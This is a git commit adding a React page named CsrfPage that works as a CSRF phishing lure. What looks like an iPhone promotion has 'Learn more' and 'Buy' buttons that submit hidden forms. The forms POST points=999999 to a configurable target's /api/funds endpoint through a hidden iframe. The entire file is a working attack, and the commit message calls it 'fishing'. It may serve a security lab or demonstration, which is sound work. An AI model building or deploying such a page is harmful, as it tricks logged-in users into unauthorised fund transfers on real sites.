87cafaa2e835bdd23afd0df4665457d6df5d4af7
jayden <j5905653@gmail.com>
2021-06-23 03:47:51 +0800

    add fishing

---
+++ pages/csrf2.js
@@ -0,0 +1,32 @@
+import React from 'react';
+import s from './index.module.css';
+import axios from 'axios';
+class CsrfPage extends React.Component {
+    static getInitialProps({query}) {
+        return {query}
+    }
+    render(){
+        const {target} = this.props.query;
+        return (
+            <div>
+                <div className={s.iphone_big}>
+                    <div className={s.iphone_big_btn1}>
+                        <form method="POST" action={`http://${target}/api/funds`} target="iframeHidden">
+                            <input type="hidden" name="points" value="999999"/>
+                            <input type="submit" className="span4 btn btn-primary" value={"進一步了解"}/>
+                         </form>
+                    </div>
+                    <div className={s.iphone_big_btn2}>
+                        <form method="POST" action={`http://${target}/api/funds`} target="iframeHidden">
+                            <input type="hidden" name="points" value="999999"/>
+                            <input type="submit" className="span4 btn btn-primary" value={"購買"}/>
+                        </form>
+                    </div>
+                </div>
+
+            </div>);
+    }
+}
+
+
+export default CsrfPage
